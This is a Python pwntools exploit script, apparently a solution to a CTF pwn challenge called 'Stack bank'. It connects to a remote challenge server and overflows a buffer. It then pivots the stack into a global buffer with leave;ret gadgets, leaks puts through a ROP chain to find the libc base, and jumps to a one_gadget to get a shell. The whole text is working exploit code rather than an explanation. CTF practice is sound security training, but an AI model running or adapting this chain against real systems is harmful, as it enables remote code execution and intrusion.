# coding: utf-8
from pwn import *

# Global pwntools config
context.os   = 'linux'
context.arch = 'amd64'
context.log_level = 'debug'
context.terminal  = ['gnome-terminal', '-x', 'sh', '-c']


def dbg(p):
    """Attach gdb for local debug."""
    gdb.attach(p, 'b *$rebase(0x13aa)')
    pause()


def u64_safe(data: bytes) -> int:
    """Convert up to 8 bytes into u64 safely."""
    return u64(data.ljust(8, b'\x00'))


def main():
    # Remote / binary / libc
    p    = remote("node5.buuoj.cn", 27089)
    elf  = ELF('./gyctf')
    libc = ELF('./libc-2.23.so')

    # Short helpers
    send      = lambda data: p.send(data)
    send_after = lambda delim, data: p.sendafter(delim, data)
    recv_n    = lambda n: p.recv(n)
    recv_until = lambda delim: p.recvuntil(delim)

    log.info("Connected to remote")
    
    # Gadgets & addresses
    bank      = 0x0000000000601080
    leave_ret = 0x0000000000400699
    main_addr = elf.symbols['main']
    pop_rdi   = 0x0000000000400703
    pop_rsi   = 0x0000000000400701  # unused here but kept for reference
    puts_got  = 0x0000000000601018
    ret_addr  = 0x000000000040069A  # not used in one_gadget path
    puts_plt  = 0x00000000004004E0

    # Info log
    log.success(f"main        = {hex(main_addr)}")
    log.success(f"puts@plt    = {hex(puts_plt)}")

    # --------------------
    # Stage 1: stack pivot & leak puts
    # --------------------
    recv_until("Ｗelcome to Stack bank,Tell me what you want\n")

    # First read: overflow buf, pivot rbp to bank+0xd0, ret to leave;ret
    payload1  = b'a' * 0x60
    payload1 += p64(bank + 0xd0)     # fake rbp
    payload1 += p64(leave_ret)       # return into leave;ret gadget
    send(payload1)

    # recv_until("Done!You can check and use your borrow stack now!\n")
    recv_until("Done!You can check and use your borrow stack now!\n")

    # Second read: write ROP chain on "borrowed stack" (bank+0xd0)
    # ROP: puts(puts_got) -> return to main
    payload2  = b'a' * 0xd0
    payload2 += p64(0)               # fake rbp for leave;ret
    payload2 += p64(pop_rdi)
    payload2 += p64(puts_got)
    payload2 += p64(puts_plt)
    payload2 += p64(main_addr)
    send(payload2)

    # Read 6 bytes of leaked puts address
    puts_addr = u64_safe(recv_n(6))
    log.success(f"puts        = {hex(puts_addr)}")

    # --------------------
    # Stage 2: calc libc base / system / one_gadget
    # --------------------
    libc_base = puts_addr - libc.symbols['puts']
    log.success(f"libc_base   = {hex(libc_base)}")

    system_addr = libc_base + libc.symbols['system']
    log.success(f"system      = {hex(system_addr)}")

    one_gadget = libc_base + 0x4526a
    log.success(f"one_gadget  = {hex(one_gadget)}")

    # --------------------
    # Stage 3: second pivot & one_gadget ROP
    # --------------------
    recv_until("Ｗelcome to Stack bank,Tell me what you want\n")

    # Pivot rbp to bank, then leave;ret will set rsp=bank and ret to [bank+8]
    payload3  = b'a' * 0x60
    payload3 += p64(bank)            # new rbp
    payload3 += p64(leave_ret)       # ret to leave;ret
    send(payload3)

    recv_until("Done!You can check and use your borrow stack now!\n")

    # On bank: [0] fake rbp, [8] one_gadget, rest filler
    payload4  = p64(0)               # fake rbp for leave;ret
    payload4 += p64(one_gadget)
    payload4 += p64(0) * 10
    # Alternative ret2system:
    # payload4  = p64(0) + p64(pop_rdi) + p64(next(libc.search(b'/bin/sh\x00'))) + p64(system_addr)
    send(payload4)

    # Get shell
    p.interactive()


if __name__ == "__main__":
    main()
